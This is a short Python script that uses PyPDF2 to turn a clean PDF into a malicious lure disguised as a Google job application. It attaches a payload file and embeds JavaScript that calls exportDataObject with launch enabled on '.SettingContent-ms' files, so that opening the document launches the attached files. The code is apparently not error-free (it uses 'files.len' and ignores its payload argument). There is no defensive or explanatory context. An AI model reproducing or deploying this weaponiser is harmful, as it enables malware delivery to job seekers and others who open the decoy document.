from PyPDF2 import PdfFileWriter, PdfFileReader


def attach_malware(input_file, output_file, payload='payload3'):
	inp = PdfFileReader(open(input_file, 'rb'))
	out = PdfFileWriter()

	for page in range(inp.getNumPages()):
		out.addPage(inp.getPage(page))

	out.addAttachment('a-form', open('payload', 'rb'))

	script = 'var files = ["PutFile", "Decode", "Execute"]; for (var i = 0; i < files.len; i++) {this.exportDataObject({cName: files[i] + ".SettingContent-ms", nLaunch: 2,});}'
	out.addJS(script)

	outstream = open(output_file, "wb")
	out.write(outstream)

if __name__ == '__main__':
	attach_malware('Clean-Google-Employment-Application.pdf', 'google-job-application.pdf')
